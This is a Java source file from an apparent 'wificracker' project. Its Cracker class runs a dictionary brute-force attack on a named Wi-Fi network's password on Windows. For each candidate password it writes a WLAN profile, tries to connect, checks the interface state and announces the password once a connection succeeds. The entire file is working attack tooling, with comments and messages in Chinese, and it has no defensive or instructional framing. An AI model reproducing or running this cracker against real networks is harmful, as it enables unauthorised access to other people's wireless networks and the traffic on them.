package pers.afei.wificracker;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Vector;
import java.util.concurrent.TimeUnit;

import pers.afei.cmd.Command;
import pers.afei.utils.CmdExecer;
import pers.afei.utils.FileOperation;
import pers.afei.utils.Util;

/**
 * Cracker
 */
public class Cracker {

    private CmdExecer cmdExecer = new CmdExecer();
    private Vector<String> vStrings = new Vector<String>();

    /**
     * 暴力跑字典
     * 
     * @param ssid    待破解的wifi
     * @param dicPath 字典路径
     * @param timeout 执行连接操作的时延（单位ms），设置太短可能会错过正确密码。信号强度越高，时延越短。信号强时建议至少设置为400~500
     */
    public void violentCrack(String ssid, String dicPath, long timeout) {

        String hex = Util.stringToHex(ssid);
        String wlanPath = "C:\\profiles\\WLAN-" + ssid + ".xml";

        FileInputStream dic = null;
        InputStreamReader in = null;
        BufferedReader bReader = null;
        
        try {
            dic = new FileInputStream(dicPath);
            in = new InputStreamReader(dic);
            bReader = new BufferedReader(in);

            String pwd;
            boolean flag = false;

            while ((pwd = bReader.readLine()) != null) {
                System.out.println("破解中： SSID:" + ssid + " password:" + pwd);
                
                Util.generator(ssid, pwd);
                
                cmdExecer.exec(Command.ADD_PROFILE + wlanPath);
                cmdExecer.exec(Command.CONNECT + ssid);
                TimeUnit.MILLISECONDS.sleep(timeout);
                
                vStrings = cmdExecer.exec(Command.SHOW_INTERFACE);

                for(String str: vStrings) {
                    String[] strings = str.trim().split("\\s+");
                    
                    if(strings[0].equals("状态") && !strings[2].equals("已连接")) {
                        break;
                    }

                    if(strings[0].equals("SSID") && (strings[2].equals(ssid) || strings[2].equals(hex))) {
                        flag = true;
                        break;
                    }
                }

                FileOperation.deleteFile(wlanPath);

                if(flag) {
                    System.out.println("破解成功！！！wlan " + ssid + " 的密码是 " + pwd);
                    break;
                } else {
                    cmdExecer.exec(Command.DELETE_PROFILE + ssid);
                }
            }

            if(!flag) {
                System.out.println("破解失败~~~");
            }
        } catch (FileNotFoundException e) {
            System.out.println("字典不存在");
        } catch (IOException e) {
            System.out.println("文件读取失败");
            ;
        } catch (InterruptedException e) {
            System.out.println("程序意外终止");;
        } finally {
            try {
                if (bReader != null) {
                    bReader.close();
                }
                if (in != null) {
                    in.close();
                }
                if (dic != null) {
                    dic.close();
                }
            } catch (IOException e) {
                System.out.println("流关闭失败");
            }
        }
    }
}